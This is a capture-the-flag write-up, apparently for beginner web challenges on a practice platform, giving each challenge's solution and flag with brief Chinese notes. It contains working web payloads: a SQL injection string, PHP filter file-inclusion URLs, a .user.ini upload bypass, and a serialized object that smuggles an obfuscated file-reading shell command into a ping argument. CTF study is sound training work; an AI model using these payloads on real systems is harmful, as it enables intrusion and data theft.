### view_source

```shell
$ curl -i "http://61.147.171.105:49608/"
HTTP/1.1 200 OK
Date: Fri, 27 Dec 2024 05:38:52 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Vary: Accept-Encoding
Content-Length: 345
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Where is the FLAG</title>
</head>
<body>
<script>
document.oncontextmenu=new Function("return false")
document.onselectstart=new Function("return false")
</script>


<h1>FLAG is not here</h1>


<!-- cyberpeace{8c1f3a789e0b78a5ce96904733cc1750} -->

</body>
</html>

```

flag: `cyberpeace{8c1f3a789e0b78a5ce96904733cc1750}`

### robots

访问 `robots.txt`

```
User-agent: *
Disallow: 
Disallow: f1ag_1s_h3re.php
```

flag: `cyberpeace{4dcaf82813c9f3103b00d476c74c6e94}`

### backup

```shell
$ curl "http://61.147.171.105:56320/index.php.bak"
<html>
<head>
    <meta charset="UTF-8">
    <title>备份文件</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>你知道index.php的备份文件名吗？</h3>
<?php
$flag="Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}"
?>
</body>
</html>

```

flag: `Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}`

### cookie

```shell
$ curl -i "http://61.147.171.105:60691/"
HTTP/1.1 200 OK
Date: Fri, 27 Dec 2024 05:44:50 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
Set-Cookie: look-here=cookie.php
Vary: Accept-Encoding
Content-Length: 417
Content-Type: text/html

<html>
<head>
    <meta charset="UTF-8">
    <title>Cookie</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>你知道什么是cookie吗？</h3>
</body>
</html>

$ curl -i "http://61.147.171.105:60691/cookie.php"
HTTP/1.1 200 OK
Date: Fri, 27 Dec 2024 05:45:01 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.26
flag: cyberpeace{cd449c1431f8a961637ddfeea9848df2}
Vary: Accept-Encoding
Content-Length: 411
Content-Type: text/html

<html>
<head>
    <meta charset="UTF-8">
    <title>Cookie</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>See the http response</h3>
</body>
</html>

```

flag: `cyberpeace{cd449c1431f8a961637ddfeea9848df2}`

### disabled_button

```shell
$ curl -X POST -d "auth=flag" "http://61.147.171.105:57133/"
<html>
<head>
    <meta charset="UTF-8">
    <title>一个不能按的按钮</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>一个不能按的按钮</h3>

<form action="" method="post" >
<input disabled class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth" />
</form>
<h3>cyberpeace{bb43ef404e6e050d9a7b013262fa82df}</h3>
</body>
</html>

```

flag: `cyberpeace{bb43ef404e6e050d9a7b013262fa82df}`

### get_post

```shell
$ curl POST -d "b=2" "http://61.147.171.105:57486/?a=1"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>POST&GET</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />

</head>
<body>

<h1>请用GET方式提交一个名为a,值为1的变量</h1>

<h1>请再以POST方式随便提交一个名为b,值为2的变量</h1><h1>cyberpeace{ad6bd2612867a70492cf42d9fef1e327}</h1>
</body>
</html>

```

flag: `cyberpeace{ad6bd2612867a70492cf42d9fef1e327}`

### weak_auth

密码 123456

flag: `cyberpeace{f94b3923f21b643912ef43a012955bea}`

### simple_php

```
http://61.147.171.105:53421/?a=[]&b=1235a
```

flag: `Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}`

### Training-WWW-Robots

flag: `cyberpeace{c4cc8324c5612db50f8cf412c9f80738}`

### baby_web

```shell
$ curl -i "http://61.147.171.105:53670/"
HTTP/1.1 302 Found
Date: Fri, 27 Dec 2024 06:37:30 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.21
FLAG: flag{very_baby_web}
Location: 1.php
Content-Length: 17
Content-Type: text/html; charset=UTF-8

Flag is hidden!

```

flag: `flag{very_baby_web}`

### php2

```
http://61.147.171.105:61732/index.phps
```

url encode 两次

```
http://61.147.171.105:61732/index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

flag: `cyberpeace{cdb0580a766823b8068b1990cc82d7b2}`

### ics-06

```
http://61.147.171.105:65141/index.php?id=2333
```

flag: `cyberpeace{7e0db468f29382a830c815a71a04a981}`

### unserialize3

```
http://61.147.171.105:65187/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```

。。。不是很懂

flag: `cyberpeace{7ce8124eee9dd3555f9bad0145c1e1e6}`

### inget

```
http://61.147.171.105:59251/?id=1' or 1='1
```

flag: `cyberpeace{041fcebccab3077b3758e05b07cb2473}`

### fileclude

```shell
$ curl POST -d "hello ctf" "http://61.147.171.105:54999/?file2=php://input&file1=php://filter/read=convert.base64-encode/resource=flag.php"
WRONG WAY!<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #007700">include(</span><span style="color: #DD0000">"flag.php"</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />if(isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file1"</span><span style="color: #007700">])&nbsp;&amp;&amp;&nbsp;isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file2"</span><span style="color: #007700">]))<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$file1&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file1"</span><span style="color: #007700">];<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$file2&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"file2"</span><span style="color: #007700">];<br />&nbsp;&nbsp;&nbsp;&nbsp;if(!empty(</span><span style="color: #0000BB">$file1</span><span style="color: #007700">)&nbsp;&amp;&amp;&nbsp;!empty(</span><span style="color: #0000BB">$file2</span><span style="color: #007700">))<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">file_get_contents</span><span style="color: #007700">(</span><span style="color: #0000BB">$file2</span><span style="color: #007700">)&nbsp;===&nbsp;</span><span style="color: #DD0000">"hello&nbsp;ctf"</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$file1</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;else<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;die(</span><span style="color: #DD0000">"NONONO"</span><span style="color: #007700">);<br />}</span>
</span>
</code>PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXs1NDdmYzQ5M2UzMjRmNjcwNTBkZTEwMDI2NjQ5ZmI4Nn0=

$ echo "PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXs1NDdmYzQ5M2UzMjRmNjcwNTBkZTEwMDI2NjQ5ZmI4Nn0=" | base64 -d
<?php
echo "WRONG WAY!";
// $flag = cyberpeace{547fc493e324f67050de10026649fb86}
```

flag: `cyberpeace{547fc493e324f67050de10026649fb86}`

### fileinclude

添加 cookie:

```
language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
```

flag: `cyberpeace{b00d522e6523361dd939401e7b1e2444}`

### file_include

```shell
$ curl "http://61.147.171.105:63732/?filename=php://filter/convert.iconv.UTF-8.UTF-7/resource=./flag.php"
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #DD0000">"./check.php"</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;if(isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'filename'</span><span style="color: #007700">])){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$filename&nbsp;&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'filename'</span><span style="color: #007700">];<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include(</span><span style="color: #0000BB">$filename</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;<br /></span>
</span>
</code>+ADw?php
+ACQ-flag+AD0'cyberpeace+AHs-2bc2a31870c55639d834b8c865806994+AH0'+ADs

$ iconv -f 'utf-7' -t 'utf-8' << EOF
+ADw?php +ACQ-flag+AD0'cyberpeace+AHs-2bc2a31870c55639d834b8c865806994+AH0'+ADs
EOF

<?php $flag='cyberpeace{2bc2a31870c55639d834b8c865806994}';
```

flag: `cyberpeace{2bc2a31870c55639d834b8c865806994}`

### easyphp

```
http://61.147.171.105:49727/?a=9e9&b=bDIOS&c={"m":"2023a","n":[[],0]}
```

flag: `cyberpeace{f675ccdb33fbae4237a47cf8a91cdf7a}`

### easyupload

```http
------WebKitFormBoundaryhTApMVmLfO50Detu
Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
Content-Type: image/gif

GIF89a
auto_prepend_file=a.jpg

------WebKitFormBoundaryhTApMVmLfO50Detu
```

flag: `cyberpeace{433a0b30c58b31ee8d3bd3f601e1b140}`

### unseping

```php
<?php

class ease {
    private $method;
    private $args;

    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
}

$e = new ease("ping", ['ca""t${IFS}fl""ag_1s_here$(printf${IFS}"\057")fl""ag_831b69012c67b35f.ph""p']);

echo base64_encode(serialize($e));
?>
```

flag: `cyberpeace{4aeb49483011d8e30d982573edd300c5}`